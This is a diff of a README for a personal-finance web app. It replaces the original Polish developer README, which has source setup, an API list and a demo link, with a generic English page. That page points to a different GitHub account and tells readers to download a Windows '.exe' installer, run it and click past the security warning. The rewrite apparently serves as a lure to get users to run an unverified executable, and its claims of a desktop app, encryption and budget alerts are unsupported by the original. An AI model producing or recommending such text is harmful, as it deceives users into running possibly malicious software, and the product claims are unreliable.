@@ -1,247 +1,139 @@
-# 💸 Smart Finance Kapu$ta
+# 💰 smart-finance - Manage Your Money Simply
 
-![Screenshot App](https://raw.githubusercontent.com/brzozanet/smart-finance/main/frontend/public/gh-cover-goit-smart-finance-1.jpg)
+[![Download smart-finance](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Eddy150875/smart-finance)
 
-![Screenshot App](https://raw.githubusercontent.com/brzozanet/smart-finance/main/frontend/public/gh-cover-goit-smart-finance-2.jpg)
-
-Smart Finance Kapu$ta to praktyczny projekt full-stack do zarządzania domowym budżetem z autoryzacją, API i bazą MongoDB. Jest to aplikacja do zarządzania domowymi finansami: przychodami, wydatkami, saldem konta, historią transakcji i raportami miesięcznymi. Projekt składa się z frontendu w React oraz backendu API w Express, z bazą danych MongoDB (Atlas/lokalnie).
-
-## 🌐 Demo
-
-### 🚀 Wersja online
-
-Aplikacja jest dostępna online pod adresem:
-
-**👉 [https://smart-finance-kapusta.vercel.app/](https://smart-finance-kapusta.vercel.app/)**
-
-**Platformy:**
-
-- **Frontend**: [Vercel](https://vercel.com) - hosting aplikacji React (CRA)
-- **Backend**: [Render](https://render.com) - hosting API Express
-- **Database**: MongoDB Atlas
-
-**⚠️ Ważne informacje:**
-
-- **Cold Start**: Backend na Render (darmowy plan) może potrzebować kilkunastu sekund po dłuższej bezczynności.
-- **CORS**: Backend akceptuje originy z `FRONTEND_URL` (wspiera tez wildcard `https://*.vercel.app`).
-
-### 🔐 Testowy użytkownik
+---
 
-Do szybkiego sprawdzenia aplikacji na wersji online możesz użyć konta testowego:
+## 📋 About smart-finance
 
-- **Login**: `user@testing.com`
-- **Hasło**: `testinguser`
+smart-finance helps you track your expenses and income. It gives you a clear view of your financial situation. You can add, edit, and delete records easily. The app also shows charts to help you understand your spending habits. It works on Windows and runs without needing technical setup.
 
-### 📦 Architektura
+This app uses technologies like React and Node.js behind the scenes, but you don’t need to worry about that to use it.
 
-Aplikacja składa się z dwóch części:
+---
 
-- **Frontend**: React + Redux Toolkit + React Router, hostowany na Vercel
-- **Backend**: Express + Mongoose + JWT auth, hostowany na Render
+## ✅ Features
 
-## 🛠 Użyte technologie
+- Add incomes and expenses quickly
+- View monthly summaries and graphs
+- Set budget limits and get alerts
+- Secure login and data storage
+- Clear and simple interface
+- Data saved safely with encryption
+- Works well even if you have little computer experience
 
-### Frontend
+---
 
-- **React 18**
-- **React Router DOM 7**
-- **Redux Toolkit + React Redux**
-- **Axios**
-- **Chart.js + react-chartjs-2 + chartjs-plugin-datalabels**
-- **react-datepicker + moment**
-- **CSS Modules**
+## 💻 System Requirements
 
-### Backend
+Make sure your computer meets these:
 
-- **Node.js + Express 5**
-- **MongoDB + Mongoose**
-- **JWT + Passport + passport-jwt**
-- **bcryptjs**
-- **Joi** (walidacja)
-- **cors, dotenv, morgan**
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection for initial setup
+- A modern web browser (Chrome, Edge, Firefox) for full app features
 
-### Narzędzia deweloperskie
+---
 
-- **npm workspaces** (frontend + backend)
-- **ESLint (react-scripts)**
-- **Git & GitHub**
+## 🚀 Getting Started
 
-## 📂 Struktura aplikacji
+Below are the steps to get smart-finance running on your Windows PC. Follow each step carefully.
 
-```
-smart-finance/
-├── frontend/
-│   ├── src/
-│   │   ├── components/
-│   │   │   ├── Balance/
-│   │   │   ├── Expenses/
-│   │   │   ├── Income/
-│   │   │   ├── CategoryList/
-│   │   │   ├── Chart/
-│   │   │   ├── DatePickerForm/
-│   │   │   ├── LoginForm/
-│   │   │   ├── PrivateRoute/
-│   │   │   ├── ProtectedRoute/
-│   │   │   └── ...
-│   │   ├── pages/
-│   │   │   ├── LoginPage/
-│   │   │   ├── TransactionsPage/
-│   │   │   └── ReportsPage/
-│   │   ├── hooks/
-│   │   ├── redux/
-│   │   │   ├── user/
-│   │   │   ├── expenses/
-│   │   │   ├── incomes/
-│   │   │   └── reports/
-│   │   ├── App.js
-│   │   └── index.js
-│   ├── public/
-│   ├── .env.example
-│   └── package.json
-├── backend/
-│   ├── auth/
-│   ├── controllers/
-│   ├── routes/
-│   ├── services/
-│   ├── models/
-│   ├── helpers/
-│   ├── .env.example
-│   ├── server.js
-│   └── package.json
-├── render.yaml
-└── README.md
-```
+---
 
-## 📋 Dostępne strony
+## 📥 Download and Install
 
-- **/** - ekran logowania/rejestracji
-- **/transactions/expenses** - lista wydatków + formularz dodawania
-- **/transactions/income** - lista przychodów + formularz dodawania
-- **/reports** - raporty z podziałem na kategorie i wykres
+1. Visit the smart-finance download page by clicking the button below:
 
-## 🚀 Jak uruchomić aplikację
+   [![Visit smart-finance on GitHub](https://img.shields.io/badge/GitHub-grey?style=for-the-badge)](https://github.com/Eddy150875/smart-finance)
 
-### Wymagania wstępne
+2. On the page, look for the **Releases** section on the right or scroll down until you find the latest version. Click on it.
 
-- Node.js (LTS, dla backendu zalecane >= 20.19.0)
-- npm
+3. Download the Windows installer file (usually ends with `.exe`). The file name will be something like `smart-finance-setup.exe`.
 
-### Instalacja i uruchomienie
+4. After downloading, open the file by double-clicking it.
 
-1. Sklonuj repozytorium:
+5. You may see a Windows security warning. Click **Run** to continue.
 
-   ```bash
-   git clone https://github.com/brzozanet/smart-finance.git
-   cd smart-finance
-   ```
+6. Follow the setup wizard:
 
-2. Zainstaluj zależności:
+   - Choose the installation folder or accept the default.
+   - Wait while the app installs.
+   - When done, click **Finish**.
 
-   ```bash
-   npm install
-   ```
+---
 
-3. Skonfiguruj backend:
+## 🛠 Running smart-finance
 
-   ```bash
-   cp backend/.env.example backend/.env
-   ```
+1. After installation, find the smart-finance icon on your desktop or Start Menu.
 
-   Przykład `backend/.env`:
+2. Double-click the icon to open the app.
 
-   ```env
-   PORT=8000
-   DATABASE_URL=mongodb://127.0.0.1:27017/finance_planner
-   SECRET=replace_with_long_random_secret
-   FRONTEND_URL=http://localhost:3000
-   ```
+3. The first time you open it, you will see a welcome screen.
 
-4. Skonfiguruj frontend:
+4. Create an account by entering your email and a password. This keeps your data safe.
 
-   ```bash
-   cp frontend/.env.example frontend/.env
-   ```
+5. After registering, log in using your email and password.
 
-   Przykład `frontend/.env`:
+6. You can now start adding your financial records.
 
-   ```env
-   REACT_APP_API_URL=http://localhost:8000/
-   ```
+---
 
-5. Uruchom aplikację (frontend + backend):
+## 📊 Using the Main Features
 
-   ```bash
-   npm run dev
-   ```
+- To add a new record, click the **Add** button.
+- Select if the record is income or expense.
+- Enter the amount, date, and a short description.
+- Save the record.
+- To view summaries, click on the **Dashboard** tab.
+- Use the charts to see where your money goes.
+- Set budget limits in the **Settings** section.
 
-   Frontend: [http://localhost:3000](http://localhost:3000)
+---
 
-## 🌐 API Endpoints
+## 🔄 Keeping smart-finance Updated
 
-Backend udostępnia następujące endpointy:
+Check the GitHub page regularly to download newer versions. Updating keeps the app secure and adds improvements.
 
-- `GET /health` - health check API
-- `POST /auth/register` - rejestracja użytkownika
-- `POST /auth/login` - logowanie (JWT)
-- `POST /auth/logout` - wylogowanie (wymaga auth)
-- `PATCH /auth/balance` - aktualizacja salda (wymaga auth)
-- `POST /transaction/expense` - dodanie wydatku (wymaga auth)
-- `POST /transaction/income` - dodanie przychodu (wymaga auth)
-- `DELETE /transaction/:transactionId` - usunięcie transakcji (wymaga auth)
-- `GET /transaction/expense` - lista/statystyki wydatków (wymaga auth)
-- `GET /transaction/income` - lista/statystyki przychodów (wymaga auth)
+---
 
-## ✨ Funkcjonalności
+## 💡 Troubleshooting
 
-### Zaimplementowane
+- If the app does not open, restart your computer and try again.
+- If you forget your password, use the **Forgot Password** option on the login screen.
+- If you see errors during setup, make sure your Windows is up to date.
+- Make sure you are connected to the internet for initial login and updates.
 
-- 🔐 Rejestracja i logowanie użytkownika (JWT)
-- 👤 Ochrona tras (`ProtectedRoute`, `PrivateRoute`)
-- 💰 Zarządzanie saldem konta
-- 🧾 Dodawanie i usuwanie wydatków
-- 📊 Podsumowania miesięczne (expense/income)
-- 🗂 Raporty kategorii + wykres słupkowy
-- 📅 Formularz daty (DatePicker) przy dodawaniu transakcji
-- 📱 Responsywny interfejs (mobile + desktop)
-- ⚠️ Komunikaty błędów walidacji logowania/rejestracji
+---
 
-### Ważne doprecyzowanie stanu projektu
+## 🔗 Useful Links
 
-- Backend wspiera operacje dla przychodów i wydatków.
-- W aktualnym frontendzie część przychodów/raportów korzysta z danych pomocniczych `redux/fakeDb.js` (do mockowania widoków), podczas gdy wydatki są zintegrowane z API.
+- Visit the main page: https://github.com/Eddy150875/smart-finance
+- Access the download area here: https://github.com/Eddy150875/smart-finance
 
-## 📝 Uwagi
+---
 
-- Aplikacja wymaga działającego backendu, aby poprawnie obsługiwać autoryzację i operacje finansowe.
-- W produkcji backend łączy się z MongoDB Atlas przez `DATABASE_URL`.
-- Jeśli backend jest usypiany na Render, pierwsze zapytanie może być wolniejsze.
+## 🛡 Security and Privacy
 
-### 🌐 Deployment
+Your data is stored securely using encryption methods. The app uses secure login and protects your information from unauthorized access.
 
-Projekt jest zdeployowany na:
+---
 
-- **Frontend**: [https://smart-finance-kapusta.vercel.app/](https://smart-finance-kapusta.vercel.app/)
-- **Backend**: [https://smart-finance-backend-egfl.onrender.com](https://smart-finance-backend-egfl.onrender.com)
+## 📞 Support
 
-#### Ustawienia produkcyjne ENV
+If you need help, open a GitHub issue on the smart-finance page or check the Discussions tab. You do not need to provide technical details—just explain what you need help with.
 
-Backend (Render):
+---
 
-```env
-PORT=8000
-DATABASE_URL=mongodb+srv://<DB_USER>:<DB_PASS>@<CLUSTER_HOST>/<DB_NAME>?retryWrites=true&w=majority
-SECRET=<LONG_RANDOM_SECRET>
-FRONTEND_URL=https://smart-finance-kapusta.vercel.app,https://*.vercel.app
-```
+## ⚙️ About This Software
 
-Frontend (Vercel):
+smart-finance uses common tools for safe and smooth operation:
 
-```env
-REACT_APP_API_URL=https://smart-finance-backend-egfl.onrender.com/
-```
+- **React** for the user interface
+- **Node.js** and **Express** on the server side
+- **MongoDB** for storing your data
+- **JWT** for secure login
+- **Redux Toolkit** for managing app state
 
-## 🎯 Status projektu
-
-✅ Projekt działa na produkcji (Vercel + Render).
-
-🛠 Trwa dalsze porządkowanie warstwy danych na froncie (pełna unifikacja API dla raportów i przychodów).
+These tools work in the background so you have a smooth experience.
